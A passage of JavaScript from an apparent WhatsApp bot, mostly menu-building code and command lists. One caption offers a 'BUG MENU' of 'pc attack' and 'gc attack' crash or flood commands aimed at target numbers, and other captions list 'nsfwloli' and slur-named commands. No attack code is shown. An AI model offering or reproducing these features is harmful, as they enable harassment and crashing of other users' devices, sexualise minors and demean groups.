    caption: `◍ اهلا بيك بقائمه الابراج اختر ما تريد \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n❶︙الثور 🐂\n❷︙العقرب 🦂\n❸︙الاسد 🦁\n❹︙القوس 🏹\n❺︙ الحمل 🐐\n❻︙السرطان 🦀\n❼︙العذراء 🦋\n❽︙ الميزان ⚖️\n❾︙الجدي 🦌\n⓿❶︙الحوت 🐋\n❶❶︙الجوزاء 👥\n❷❶︙الدلو 🪣\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n◍︙اذا لما يظهر برجك في الازرار بالاسفل يجب عليك كتابة اسم برجك » لمعرفته\n◍︙مثال » العقرب  \n `,
    footer: botname,
    buttons: buttons,
    headerType: 50,
    }
    XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
    }
    break
            case 'command': {
	const sections = [{
								"title": "Initial Features Of Bot 🦄",
								"rows": [
									{
										"title": "Other ☕",
										"description": "Displays The List Of Other Features",
										"rowId": `${prefix}othermenu`
									}
								]
							},
							{
								"title": "Bot Features ❤️",
								"rows": [
									{
										"title": "All Menu 🥀",
										"description": "Displays The List Of All The Features!",
										"rowId": `${prefix}allmenu`
									},
									{
										"title": "Owner Menu 💠",
										"description": "Displays The List Of Owner Features",
										"rowId": `${prefix}ownermenu`
										},
									{
										"title": "Group Menu ✨",
										"description": "Displays The List Of Main Features",
										"rowId": `${prefix}groupmenu`
										},
										{
										"title": "Maker Menu 🌈",
										"description": "Displays The List Of Logo Making Features",
										"rowId": `${prefix}makermenu`
									},
									{
										"title": "Sound Menu 🎵",
										"description": "Displays The List Of Sound Features",
										"rowId": `${prefix}soundmenu`
									},
									{
										"title": "Download Menu ↘️",
										"description": "Displays The List Of Download Features",
										"rowId": `${prefix}downloadmenu`
									},
									{
										"title": "Sticker Menu 🃏",
										"description": "Displays The List Of Sticker Features",
										"rowId": `${prefix}stickermenu`
									},
									{
										"title": "Search Menu 🔎",
										"description": "Displays The List Of Searching Features",
										"rowId": `${prefix}searchmenu`
									},
									{
										"title": "Random Image Menu 🌆",
										"description": "Displays The List Of Random Image Features",
										"rowId": `${prefix}randomimagemenu`
									},
									{
										"title": "Random Video Menu 🌆",
										"description": "Displays The List Of Random Video Features",
										"rowId": `${prefix}randomvideomenu`
									},
									{
										"title": "Image Effect Menu 🖼️",
										"description": "Displays The List Of Image Effect Features",
										"rowId": `${prefix}imageeffectmenu`
									},
										{
											"title": "Anime Menu 😘",
										"description": "Displays The List Of Random Anime Features",
										"rowId": `${prefix}animemenu`
										},
										{
											"title": "Emote Menu 😀",
										"description": "Displays The List Of Emote Features",
										"rowId": `${prefix}emotemenu`
										},
										{
										"title": "Anime Sticker Menu ☺️",
										"description": "Displays The List Of Anime Sticker Features",
										"rowId": `${prefix}animestickermenu`
									     },
									{
										"title": "Nsfw Menu 🤓",
										"description": "Displays The List Of Nsfe Features",
										"rowId": `${prefix}nsfwmenu`
									     },
										{
											"title": "Fun Menu 🕺",
										"description": "Displays The List Of Fun Features",
										"rowId": `${prefix}funmenu`
										},
										{
										"title": "Game Menu 🎮",
										"description": "Displays The List Of Game Features",
										"rowId": `${prefix}gamemenu`
									},
										{
											"title": "Convert Menu ⚒️",
										"description": "Displays The List Of Convert Features",
										"rowId": `${prefix}convertmenu`
										},
										{
											"title": "Database Menu ♻️",
										"description": "Displays The List Of Database Features",
										"rowId": `${prefix}databasemenu`
										},
										{
										"title": "Other Menu 🐸",
										"description": "Displays The List Miscellaneous Features",
										"rowId": `${prefix}othermenu`
									     },
										{
										"title": "War Menu☣️",
										"description": "Displays The List Of War Features",
										"rowId": `${prefix}warmenu`
									}
								]
							},
							{
								"title": "Chat With Fellow Users 🌝",
								"rows": [
									{
										"title": "Anonymous Chat Menu 🏻‍♂️",
										"description": "Displays The List Of Anonymous Chat Features",
										"rowId": `${prefix}anonymousmenu`
									}
								]
							},
							{
								"title": "Credit ©️",
								"rows": [
									{
										"title": "Thanks To ❤️",
										"description": "Displays The List Of Credit Of The Bot !!",
										"rowId": `${prefix}tqtt`
									}
								]
							}
						]
const listMessage = {
  text: "Please choose the menu",
  footer: `${botname}\n📍YouTube: ${websitex}\n🍜Script: ${botscript}`,
  title: `Hi 👋 ${pushname}`,
  buttonText: "Menu",
  sections
}
const sendMsg = await XeonBotInc.sendMessage(m.chat, listMessage)
}
break
            case 'allmenu':{
var unicorn = await getBuffer(picak+'All Menu')

const buttons = [
  {buttonId: 'script', buttonText: {displayText: 'Script 🔖'}, type: 1},
  {buttonId: 'donate', buttonText: {displayText: 'Donate 🍵'}, type: 1},
  {buttonId: 'owner', buttonText: {displayText: 'Owner 🤣'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `╔═══════✪ OWNER 	
╠ ${prefix}self
╠ ${prefix}public
╠ ${prefix}join [link]
╠ ${prefix}leavegc
╠ ${prefix}setbio
╠ ${prefix}bctext [text]
╠ ${prefix}bcimage [reply img/text]
╠ ${prefix}bcvideo [reply img/text]
╠ ${prefix}setbotpp [image]
╠ ${prefix}setthumb [reply img]
╠ ${prefix}setexif
╠ ${prefix}hijack
╠ ${prefix}creategroup [name]
╠ ${prefix}block [tag/number]
╠ ${prefix}unblock [tag/number]
╠═══════✪ GROUP 	        
╠${prefix}grouplink
╠${prefix}ephemeral [option]
╠${prefix}setgcpp [image]
╠${prefix}setname [text]
╠${prefix}setdesc [text]
╠${prefix}group 
╠${prefix}resetgrouplink
╠${prefix}editinfo [option]
╠${prefix}menfess [number]
╠${prefix}add [user]
╠${prefix}kick [reply/tag]
╠${prefix}hidetag [text]
╠${prefix}tagall [text]
╠${prefix}antilinkgc [on/off]
╠${prefix}antilinktg [on/off]
╠${prefix}antilinktt [on/off]
╠${prefix}antilinkytch [on/off]
╠${prefix}antilinkytvid [on/off]
╠${prefix}antilinkig [on/off]
╠${prefix}antilinkfb [on/off]
╠${prefix}antilinktwit [on/off]
╠${prefix}antilinkall [on/off]
╠${prefix}antivirus [on/off]
╠${prefix}antitoxic [on/off]
╠${prefix}antiwame [on/off]
╠${prefix}nsfw [on/off]
╠${prefix}promote [reply/tag]
╠${prefix}demote [reply/tag]
╠${prefix}react [reply emoji]
╠${prefix}vote
╠${prefix}devote
╠${prefix}upvote
╠${prefix}checkvote
╠${prefix}delvote
╠═══════✪ MAKER 
╠${prefix}candy
╠${prefix}blackpinkneon
╠${prefix}deepsea
╠${prefix}scifi
╠${prefix}fiction
╠${prefix}berry
╠${prefix}fruitjuice
╠${prefix}biscuit
╠${prefix}wood
╠${prefix}chocolate
╠${prefix}matrix
╠${prefix}blood
╠${prefix}halloween
╠${prefix}wicker
╠${prefix}darkgold
╠${prefix}firework
╠${prefix}skeleton
╠${prefix}sand
╠${prefix}glue
╠${prefix}leaves
╠${prefix}magma
╠${prefix}lava
╠${prefix}rockart
╠${prefix}bloodglas
╠${prefix}underwater
╠${prefix}textmaker
╠${prefix}honey
╠${prefix}ice
╠${prefix}watercolor
╠${prefix}multicolor
╠${prefix}snow
╠${prefix}harrypot
╠${prefix}harrypotter
╠${prefix}brokenglass
╠${prefix}waterpipe
╠${prefix}spooky
╠${prefix}circuit
╠${prefix}metallic
╠${prefix}demon
╠${prefix}sparklechristmas
╠${prefix}christmas
╠${prefix}3dchristmas
╠${prefix}3dbox
╠${prefix}waterdrop
╠${prefix}lion2
╠${prefix}papercut
╠${prefix}transformer
╠${prefix}neondevil
╠${prefix}3davengers
╠${prefix}3dstone
╠${prefix}3dstone2
╠${prefix}summertime
╠${prefix}thunder
╠${prefix}window
╠${prefix}graffiti
╠${prefix}graffitibike
╠${prefix}pornhub
╠${prefix}glitch
╠${prefix}blackpinkart
╠${prefix}glitch2
╠${prefix}glitch3
╠${prefix}3dspace
╠${prefix}lion
╠${prefix}3dneon
╠${prefix}greenneon
╠${prefix}bokeh
╠${prefix}holographic
╠${prefix}bear
╠${prefix}wolf
╠${prefix}joker
╠${prefix}dropwater
╠${prefix}dropwater2
╠${prefix}thewall
╠${prefix}neonlight
╠${prefix}natural
╠${prefix}carbon
╠${prefix}pencil
╠${prefix}blackpink2
╠${prefix}neon
╠${prefix}neonlight2
╠${prefix}toxic
╠${prefix}strawberry
╠${prefix}discovery
╠${prefix}1917
╠ ${prefix}sci_fi
╠ ${prefix}ancient
╠ ${prefix}fabric
╠ ${prefix}hoorror
╠ ${prefix}whitebear
╠ ${prefix}juice
╠ ${prefix}batman
╠ ${prefix}multicolor
╠ ${prefix}wonderful
╠ ${prefix}sketch
╠ ${prefix}marvel
╠ ${prefix}foggy
╠ ${prefix}writing
╠ ${prefix}halloweenfire
╠ ${prefix}halloween
╠ ${prefix}watercolor
╠ ${prefix}classic
╠═════✪ DOWNLOAD 	
╠${prefix}tiktok [url]
╠${prefix}tiktokaudio [url]
╠${prefix}instagram [url]
╠${prefix}spotify [url]
╠${prefix}mediafire [url]
╠${prefix}ytmp3 [url|quality]
╠${prefix}ytmp4 [url|quality]
╠${prefix}gitclone [repo link]
╠═══════✪ SEARCH 	
╠${prefix}play [query]
╠${prefix}song [query]
╠${prefix}yts [query]
╠${prefix}lyrics [query]
╠${prefix}gimage [query]
╠${prefix}google [query]
╠${prefix}anime [query]
╠${prefix}pinterest [query]
╠${prefix}image [query]
╠${prefix}wallpaper [query]
╠${prefix}searchno [number]
╠${prefix}horoscope [query]
╠${prefix}imdb [movie name]
╠${prefix}weather [loc name]
╠${prefix}genshin [char name]
╠${prefix}wikimedia [query]
╠${prefix}ytsearch [query]
╠${prefix}ringtone [query]
╠═══════✪ CONVERT 
╠ ${prefix}toimage [reply stick]
╠ ${prefix}sticker [reply img|gif]
╠ ${prefix}take [reply img|gif|stik]
╠ ${prefix}smeme [reply img]
╠ ${prefix}emoji [emoji]
╠ ${prefix}tovideo [reply img]
╠ ${prefix}togif [reply stick]
╠ ${prefix}tovn [reply aud]
╠ ${prefix}tomp3 [reply vn]
╠ ${prefix}toaudio [reply vid]
╠ ${prefix}ebinary [reply txt]
╠ ${prefix}dbinary [reply txt]
╠ ${prefix}tinyurl [link]
╠ ${prefix}styletext [text]
╠${prefix}volume [reply aud]
╠${prefix}bass [reply aud]
╠${prefix}blown [reply aud]
╠${prefix}deep [reply aud]
╠${prefix}earrape [reply aud]
╠${prefix}fast [reply aud]
╠${prefix}fat [reply aud]
╠${prefix}nightcore [reply aud]
╠${prefix}reverse [reply aud]
╠${prefix}robot [reply aud]
╠${prefix}slow [reply aud]
╠${prefix}smooth [reply aud]
╠${prefix}squirrel [reply aud]
╠═══════✪ IMG EFFECT 
╠${prefix}removebg [reply img]
╠═══════✪ RANDOM IMG 
╠${prefix}coffee
╠${prefix}woof
╠${prefix}meow
╠${prefix}lizard
╠${prefix}chinese
╠${prefix}japanese
╠${prefix}korean
╠${prefix}indo
╠${prefix}thai
╠${prefix}vietnamese
╠${prefix}malay
╠${prefix}hijab
╠${prefix}randomgirl
╠${prefix}randomboy
╠${prefix}aesthetic
╠${prefix}antiwork
╠${prefix}cosplay
╠${prefix}car
╠${prefix}bike
╠${prefix}doggo
╠${prefix}cat
╠${prefix}notnot
╠${prefix}kayes
╠${prefix}justina
╠${prefix}ryujin
╠${prefix}boneka
╠${prefix}rose
╠${prefix}kpop
╠${prefix}blackpink
╠${prefix}ulzzangboy
╠${prefix}ulzzanggirl
╠${prefix}pubg
╠${prefix}hacking
╠${prefix}profilepicture
╠${prefix}couplepicture
╠${prefix}wallphone
╠${prefix}wallml
╠═══════✪ RANDOM VIDEO
╠${prefix}tiktokgirl	
╠${prefix}tiktoknukhty
╠${prefix}tiktokpanrika
╠${prefix}tiktokkayes
╠${prefix}tiktoknotnot
╠${prefix}tiktokghea
╠${prefix}tiktoksantuy
╠${prefix}tiktokbocil
╠═══════✪ EMOTE 
╠${prefix}instagramemoji
╠${prefix}facebookemoji
╠${prefix}iphoneemoji
╠${prefix}samsungemoji
╠${prefix}joyemoji
╠${prefix}skypeemoji
╠${prefix}twitteremoji
╠${prefix}whatsappemoji
╠${prefix}microsoftemoji
╠${prefix}googleemoji
╠${prefix}pediaemoji
╠${prefix}microsoftemoji
╠═══════✪ ANIME 
╠${prefix}animeneko
╠${prefix}waifu
╠${prefix}animewaifu
╠${prefix}animeawoo
╠${prefix}shinobu
╠${prefix}foxgirl
╠${prefix}animemegumin
╠${prefix}loli-waifu
╠${prefix}8ball
╠${prefix}animenom
╠${prefix}goose
╠${prefix}avatar
╠${prefix}tickle
╠${prefix}gecg
╠${prefix}feed
╠${prefix}husbu
╠${prefix}neko2
╠${prefix}randomanime
╠${prefix}shota
╠${prefix}waifu2
╠${prefix}animeslap
╠${prefix}animepat
╠${prefix}animeneko
╠${prefix}animekiss
╠${prefix}animewlp
╠${prefix}animecuddle
╠${prefix}animecry
╠${prefix}animekill
╠${prefix}animelick
╠${prefix}animebite
╠${prefix}animeyeet
╠${prefix}animebully
╠${prefix}animebonk
╠${prefix}animewink
╠${prefix}animepoke
╠${prefix}animesmile
╠${prefix}animewave
╠${prefix}animeawoo
╠${prefix}animeblush
╠${prefix}animesmug
╠${prefix}animeglomp
╠${prefix}animehappy
╠${prefix}animedance
╠${prefix}animecringe
╠${prefix}animehighfive
╠${prefix}animehandhold
╠${prefix}animemegumin
╠${prefix}animesmug
╠${prefix}couplepp
╠${prefix}animewall [query]
╠${prefix}animewall2 [query]
╠══════✪ STICKER 
╠ ${prefix}patrick
╠ ${prefix}emoji
╠ ${prefix}emojimix
╠ ${prefix}doge
╠ ${prefix}lovesticker
╠ ${prefix}animestick
╠ ${prefix}spongebob
╠ ${prefix}gojosatoru
╠ ${prefix}nicholas
╠ ${prefix}cartoon
╠ ${prefix}stickman
╠════✪ ANIME STICKER 
╠${prefix}loli
╠${prefix}bully
╠${prefix}cuddle
╠${prefix}cry
╠${prefix}hug
╠${prefix}awoo
╠${prefix}kiss
╠${prefix}lick
╠${prefix}pat
╠${prefix}smug
╠${prefix}bonk
╠${prefix}yeet
╠${prefix}blush
╠${prefix}smile
╠${prefix}wave
╠${prefix}highfive
╠${prefix}handhold
╠${prefix}nom
╠${prefix}glomp
╠${prefix}bite
╠${prefix}slap
╠${prefix}kill
╠${prefix}happy
╠${prefix}wink
╠${prefix}poke
╠${prefix}dance
╠${prefix}cringe
╠${prefix}neko
╠${prefix}gura
╠═══════✪ NSFW 
╠${prefix}gifhentai
╠${prefix}gifblowjob
╠${prefix}hentaivideo
╠${prefix}hneko
╠${prefix}nwaifu
╠${prefix}animespank
╠${prefix}trap
╠${prefix}gasm
╠${prefix}ahegao
╠${prefix}ass
╠${prefix}bdsm
╠${prefix}blowjob
╠${prefix}cuckold
╠${prefix}cum
╠${prefix}milf
╠${prefix}eba
╠${prefix}ero
╠${prefix}femdom
╠${prefix}foot
╠${prefix}gangbang
╠${prefix}glasses
╠${prefix}hentai
╠${prefix}jahy
╠${prefix}manga
╠${prefix}masturbation
╠${prefix}neko-hentai
╠${prefix}neko-hentai2
╠${prefix}nsfwloli
╠${prefix}orgy
╠${prefix}panties
╠${prefix}pussy
╠${prefix}tentacles
╠${prefix}thights
╠${prefix}yuri
╠${prefix}zettai
╠═══════✪ FUN 
╠ ${prefix}say [text]
╠ ${prefix}define [text]
╠ ${prefix}how [text
╠ ${prefix}when [text]
╠ ${prefix}where [text]
╠ ${prefix}is [text]
╠ ${prefix}what [text]
╠ ${prefix}can [text]
╠ ${prefix}rate [text]
╠ ${prefix}coolcheck [tag]
╠ ${prefix}stupidcheck [tag]
╠ ${prefix}waifucheck [tag]
╠ ${prefix}evilcheck [tag]
╠ ${prefix}dogcheck [tag]
╠ ${prefix}hotcheck [tag]
╠ ${prefix}smartcheck [tag]
╠ ${prefix}uncleancheck [tag]
╠ ${prefix}greatcheck [tag]
╠ ${prefix}beautifulcheck [tag]
╠ ${prefix}awesomecheck [tag]
╠ ${prefix}prettycheck [tag]
╠ ${prefix}lesbiancheck [tag]
╠ ${prefix}gaycheck [tag]
╠ ${prefix}cutecheck [tag]
╠ ${prefix}uglycheck [tag]
╠ ${prefix}hornycheck [tag]
╠ ${prefix}charactercheck [tag]
╠ ${prefix}lovelycheck [tag]
╠ ${prefix}couple
╠ ${prefix}soulmate
╠ ${prefix}hot
╠ ${prefix}sexy
╠ ${prefix}kind
╠ ${prefix}idiot
╠ ${prefix}handsome
╠ ${prefix}beautiful
╠ ${prefix}cute
╠ ${prefix}pretty
╠ ${prefix}lesbian
╠ ${prefix}noob
╠ ${prefix}bastard
╠ ${prefix}foolish
╠ ${prefix}nerd
╠ ${prefix}asshole
╠ ${prefix}gay
╠ ${prefix}smart
╠ ${prefix}stubble
╠ ${prefix}dog
╠ ${prefix}horny
╠ ${prefix}cunt
╠ ${prefix}wibu
╠ ${prefix}noobra
╠ ${prefix}nibba
╠ ${prefix}nibbi
╠ ${prefix}comrade
╠ ${prefix}mumu
╠ ${prefix}rascal
╠ ${prefix}scumbag
╠ ${prefix}nuts
╠ ${prefix}fagot
╠ ${prefix}scoundrel
╠ ${prefix}ditch
╠ ${prefix}dope
╠ ${prefix}gucci
╠ ${prefix}lit
╠ ${prefix}dumbass
╠ ${prefix}crackhead
╠ ${prefix}mf
╠ ${prefix}motherfucker
╠ ${prefix}sucker
╠ ${prefix}fuckboy
╠ ${prefix}playboy
╠ ${prefix}fuckgirl
╠ ${prefix}playgirl
╠ ${prefix}quotes
╠══════✪ SOUND 
╠ ${prefix}sound1
╠ ${prefix}sound2
╠ ${prefix}sound3
╠ ${prefix}sound4
╠ ${prefix}sound5
╠ ${prefix}sound6
╠ ${prefix}sound7
╠ ${prefix}sound8
╠ ${prefix}sound9
╠ ${prefix}sound10
╠ ${prefix}sound11
╠ ${prefix}sound12
╠ ${prefix}sound13
╠ ${prefix}sound14
╠ ${prefix}sound15
╠ ${prefix}sound16
╠ ${prefix}sound17
╠ ${prefix}sound18
╠ ${prefix}sound19
╠ ${prefix}sound20
╠ ${prefix}sound21
╠ ${prefix}sound22
╠ ${prefix}sound23
╠ ${prefix}sound24
╠ ${prefix}sound25
╠ ${prefix}sound26
╠ ${prefix}sound27
╠ ${prefix}sound28
╠ ${prefix}sound29
╠ ${prefix}sound30
╠ ${prefix}sound31
╠ ${prefix}sound32
╠ ${prefix}sound33
╠ ${prefix}sound34
╠ ${prefix}sound35
╠ ${prefix}sound36
╠ ${prefix}sound37
╠ ${prefix}sound38
╠ ${prefix}sound39
╠ ${prefix}sound40
╠ ${prefix}sound41
╠ ${prefix}sound42
╠ ${prefix}sound43
╠ ${prefix}sound44
╠ ${prefix}sound45
╠ ${prefix}sound46
╠ ${prefix}sound47
╠ ${prefix}sound48
╠ ${prefix}sound49
╠ ${prefix}sound50
╠ ${prefix}sound51
╠ ${prefix}sound52
╠ ${prefix}sound53
╠ ${prefix}sound54
╠ ${prefix}sound55
╠ ${prefix}sound56
╠ ${prefix}sound57
╠ ${prefix}sound58
╠ ${prefix}sound59
╠ ${prefix}sound60
╠ ${prefix}sound61
╠ ${prefix}sound62
╠ ${prefix}sound63
╠ ${prefix}sound64
╠ ${prefix}sound65
╠ ${prefix}sound66
╠ ${prefix}sound67
╠ ${prefix}sound68
╠ ${prefix}sound69
╠ ${prefix}sound70
╠ ${prefix}sound71
╠ ${prefix}sound72
╠ ${prefix}sound73
╠ ${prefix}sound74
╠ ${prefix}sound75
╠ ${prefix}sound76
╠ ${prefix}sound77
╠ ${prefix}sound78
╠ ${prefix}sound79
╠ ${prefix}sound80
╠ ${prefix}sound81
╠ ${prefix}sound82
╠ ${prefix}sound83
╠ ${prefix}sound84
╠ ${prefix}sound85
╠ ${prefix}sound86
╠ ${prefix}sound87
╠ ${prefix}sound88
╠ ${prefix}sound89
╠ ${prefix}sound90
╠ ${prefix}sound91
╠ ${prefix}sound92
╠ ${prefix}sound93
╠ ${prefix}sound94
╠ ${prefix}sound95
╠ ${prefix}sound96
╠ ${prefix}sound97
╠ ${prefix}sound98
╠ ${prefix}sound99
╠ ${prefix}sound100
╠ ${prefix}sound101
╠ ${prefix}sound102
╠ ${prefix}sound103
╠ ${prefix}sound104
╠ ${prefix}sound105
╠ ${prefix}sound106
╠ ${prefix}sound107
╠ ${prefix}sound108
╠ ${prefix}sound109
╠ ${prefix}sound110
╠ ${prefix}sound111
╠ ${prefix}sound112
╠ ${prefix}sound113
╠ ${prefix}sound114
╠ ${prefix}sound115
╠ ${prefix}sound116
╠ ${prefix}sound117
╠ ${prefix}sound118
╠ ${prefix}sound119
╠ ${prefix}sound120
╠ ${prefix}sound121
╠ ${prefix}sound122
╠ ${prefix}sound123
╠ ${prefix}sound124
╠ ${prefix}sound125
╠ ${prefix}sound126
╠ ${prefix}sound127
╠ ${prefix}sound128
╠ ${prefix}sound129
╠ ${prefix}sound130
╠ ${prefix}sound131
╠ ${prefix}sound132
╠ ${prefix}sound133
╠ ${prefix}sound134
╠ ${prefix}sound135
╠ ${prefix}sound136
╠ ${prefix}sound137
╠ ${prefix}sound138
╠ ${prefix}sound139
╠ ${prefix}sound140
╠ ${prefix}sound141
╠ ${prefix}sound142
╠ ${prefix}sound143
╠ ${prefix}sound144
╠ ${prefix}sound145
╠ ${prefix}sound146
╠ ${prefix}sound147
╠ ${prefix}sound148
╠ ${prefix}sound149
╠ ${prefix}sound150
╠ ${prefix}sound151
╠ ${prefix}sound152
╠ ${prefix}sound153
╠ ${prefix}sound154
╠ ${prefix}sound155
╠ ${prefix}sound156
╠ ${prefix}sound157
╠ ${prefix}sound158
╠ ${prefix}sound159
╠ ${prefix}sound160
╠ ${prefix}sound161
╠══════✪ GAME 
╠ ${prefix}truth
╠ ${prefix}dare
╠ ${prefix}tictactoe
╠ ${prefix}delttt
╠ ${prefix}guess [option]
╠ ${prefix}math [mode]
╠ ${prefix}suitpvp [tag]
╠══✪ ANONYMOUS CHAT 
╠${prefix}anonymous
╠${prefix}start
╠${prefix}next
╠${prefix}leave
╠══════✪ DATABASE 
╠ ${prefix}setcmd
╠ ${prefix}listcmd
╠ ${prefix}delcmd
╠ ${prefix}lockcmd
╠ ${prefix}addmsg
╠ ${prefix}listmsg
╠ ${prefix}getmsg
╠ ${prefix}delmsg
╠══════✪ OTHER 
╠ ${prefix}afk
╠ ${prefix}id
╠ ${prefix}toqr [link]
╠ ${prefix}repeat
╠ ${prefix}readmore [text]
╠ ${prefix}toviewonce
╠ ${prefix}fliptext [text]]
╠ ${prefix}chatinfo
╠ ${prefix}alive
╠ ${prefix}script
╠ ${prefix}ping
╠ ${prefix}owner
╠ ${prefix}menu
╠ ${prefix}delete
╠ ${prefix}quoted
╠ ${prefix}listpc
╠ ${prefix}listgc
╠ ${prefix}donate
╠ ${prefix}request
╠ ${prefix}report [bug]
╠═══════✪「 BUG MENU 」	
╠════☾pc attack☽
╠${prefix}pcbut [number]
╠${prefix}pcvn [number]
╠${prefix}pcstick [number]
╠${prefix}pcfast [number]
╠${prefix}pcslow [number]
╠${prefix}pcbunny [number]
╠${prefix}xcrasher [amount]
╠${prefix}pccontact [amount]
╠${prefix}virtex5 [amount]
╠${prefix}flower [amount]
╠${prefix}pollbug [amount]
╠${prefix}catalogbug [amount]
╠${prefix}trollybug [amount]
╠${prefix}trollybug2 [amount]
╠════☾gc attack☽
╠${prefix}gcslow
╠${prefix}gcfast
╠${prefix}gcbunny
╠${prefix}tagallbug
╠════☾pc & gc attack☽
╠${prefix}vnbug [amount]
╠${prefix}docbug [amount]
╠${prefix}pcgcslow [number]
╠${prefix}pcgcfast [number]
╠${prefix}pcgcbunny [number]
╠${prefix}textshot
╠${prefix}docfuck [amount]
╠${prefix}docsoft [amount]
╠${prefix}docsoft2 [amount]
╚═════════════✪`,
    footer: `${botname}`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await XeonBotInc.sendMessage(m.chat, buttonMessage)
}
break
      case 'ownermenu':{
	   var unicorn = await getBuffer(picak+'Owner Menu')
const buttons = [
  {buttonId: 'script', buttonText: {displayText: 'Script 🔖'}, type: 1},
  {buttonId: 'donate', buttonText: {displayText: 'Donate 🍵'}, type: 1},
  {buttonId: 'owner', buttonText: {displayText: 'Owner ??'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `╔═══════✪ OWNER 	
╠ ${prefix}self
╠ ${prefix}public
╠ ${prefix}join [link]
╠ ${prefix}leavegc
╠ ${prefix}setbio
╠ ${prefix}hijack
╠ ${prefix}creategroup [name]
╠ ${prefix}block [user]
╠ ${prefix}unblock [user]
╠ ${prefix}broadcast [text]
╠ ${prefix}setppbot [image]
╠ ${prefix}setthumb [reply img]
╠ ${prefix}setexif
╚═════════════✪`,
    footer: `${botname}`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await XeonBotInc.sendMessage(m.chat, buttonMessage)
}
break
            case 'groupmenu':{
var unicorn = await getBuffer(picak+'Group Menu')

const buttons = [
  {buttonId: 'script', buttonText: {displayText: 'Script 🔖'}, type: 1},
  {buttonId: 'donate', buttonText: {displayText: 'Donate 🍵'}, type: 1},
  {buttonId: 'owner', buttonText: {displayText: 'Owner 🤣'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `╔═══════✪ GROUP 	
╠${prefix}grouplink
╠${prefix}ephemeral [option]
╠${prefix}setgcpp [image]
╠${prefix}setname [text]
╠${prefix}setdesc [text]
╠${prefix}group
╠${prefix}botgroups
╠${prefix}resetgrouplink
╠${prefix}editinfo [option]
╠${prefix}add [user]
╠${prefix}menfess [number]
╠${prefix}kick [reply/tag]
╠${prefix}hidetag [text]
╠${prefix}tagall [text]
╠${prefix}autosticker [on/off]
╠${prefix}autostickerpc [on/off]
╠${prefix}leveling [on/off]
╠${prefix}antilinkgc [on/off] 
╠${prefix}antilinktg [on/off]
╠${prefix}antilinktt [on/off]
╠${prefix}antilinkytch [on/off]
╠${prefix}antilinkytvid [on/off]
╠${prefix}antilinkig [on/off]
╠${prefix}antilinkfb [on/off]
╠${prefix}antilinktwit [on/off]
╠${prefix}antilinkall [on/off]
╠${prefix}antivirus [on/off]
╠${prefix}antitoxic [on/off]
╠${prefix}antiwame [on/off]
╠${prefix}nsfw [on/off]
╠${prefix}promote [reply/tag]
╠${prefix}demote [reply/tag]
╠${prefix}react [reply emoji]
╠${prefix}getpp [reply user]
╠${prefix}vote
╠${prefix}devote
╠${prefix}upvote
╠${prefix}checkvote
╠${prefix}delvote
╚═════════════✪`,
    footer: `${botname}`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await XeonBotInc.sendMessage(m.chat, buttonMessage)
}
break
case 'makermenu':{
var unicorn = await getBuffer(picak+'Maker Menu')

const buttons = [
  {buttonId: 'script', buttonText: {displayText: 'Script 🔖'}, type: 1},
  {buttonId: 'donate', buttonText: {displayText: 'Donate 🍵'}, type: 1},
  {buttonId: 'owner', buttonText: {displayText: 'Owner 🤣'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `╔═══════✪ MAKER 	
╠${prefix}candy
╠${prefix}8bit
╠${prefix}horror
╠${prefix}hoorror
╠${prefix}retro
╠${prefix}blackpinkneon
╠${prefix}deepsea
╠${prefix}scifi
╠${prefix}fiction
╠${prefix}berry
╠${prefix}fruitjuice
╠${prefix}biscuit
╠${prefix}wood
╠${prefix}chocolate
╠${prefix}matrix
╠${prefix}blood
╠${prefix}halloween
╠${prefix}wicker
╠${prefix}darkgold
╠${prefix}firework
╠${prefix}skeleton
╠${prefix}sand
╠${prefix}glue
╠${prefix}leaves
╠${prefix}magma
╠${prefix}lava
╠${prefix}rockart
╠${prefix}bloodglas
╠${prefix}underwater
╠${prefix}textmaker
╠${prefix}honey
╠${prefix}ice
╠${prefix}watercolor
╠${prefix}multicolor
╠${prefix}snow
╠${prefix}harrypot
╠${prefix}harrypotter
╠${prefix}brokenglass
╠${prefix}waterpipe
╠${prefix}spooky
╠${prefix}circuit
╠${prefix}metallic
╠${prefix}demon
╠${prefix}sparklechristmas
╠${prefix}christmas
╠${prefix}3dchristmas
╠${prefix}3dbox
╠${prefix}waterdrop
╠${prefix}lion2
╠${prefix}papercut
╠${prefix}transformer
╠${prefix}neondevil
╠${prefix}3davengers
╠${prefix}3dstone
╠${prefix}3dstone2
╠${prefix}summertime
╠${prefix}thunder
╠${prefix}window
╠${prefix}graffiti
╠${prefix}graffitibike
╠${prefix}pornhub
╠${prefix}glitch
╠${prefix}blackpinkart
╠${prefix}glitch2
╠${prefix}glitch3
╠${prefix}3dspace
╠${prefix}lion
╠${prefix}3dneon
╠${prefix}greenneon
╠${prefix}bokeh
╠${prefix}holographic
╠${prefix}bear
╠${prefix}wolf
╠${prefix}joker
╠${prefix}dropwater
╠${prefix}dropwater2
╠${prefix}thewall
╠${prefix}neonlight
╠${prefix}natural
╠${prefix}carbon
╠${prefix}pencil
╠${prefix}blackpink2
╠${prefix}neon
╠${prefix}neonlight2
╠${prefix}toxic
╠${prefix}strawberry
╠${prefix}discovery
╠${prefix}1917
╠ ${prefix}sci_fi
╠ ${prefix}ancient
╠ ${prefix}fabric
╠ ${prefix}hoorror
╠ ${prefix}whitebear
╠ ${prefix}juice
╠ ${prefix}batman
╠ ${prefix}multicolor
╠ ${prefix}wonderful
╠ ${prefix}sketch
╠ ${prefix}marvel
╠ ${prefix}foggy
╠ ${prefix}writing
╠ ${prefix}halloweenfire
╠ ${prefix}halloween
╠ ${prefix}watercolor
╠ ${prefix}classic
╚═════════════✪`,
    footer: `${botname}`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await XeonBotInc.sendMessage(m.chat, buttonMessage)
}
break
            case 'downloadmenu':{
var unicorn = await getBuffer(picak+'Download Menu')

const buttons = [
  {buttonId: 'script', buttonText: {displayText: 'Script 🔖'}, type: 1},
  {buttonId: 'donate', buttonText: {displayText: 'Donate 🍵'}, type: 1},
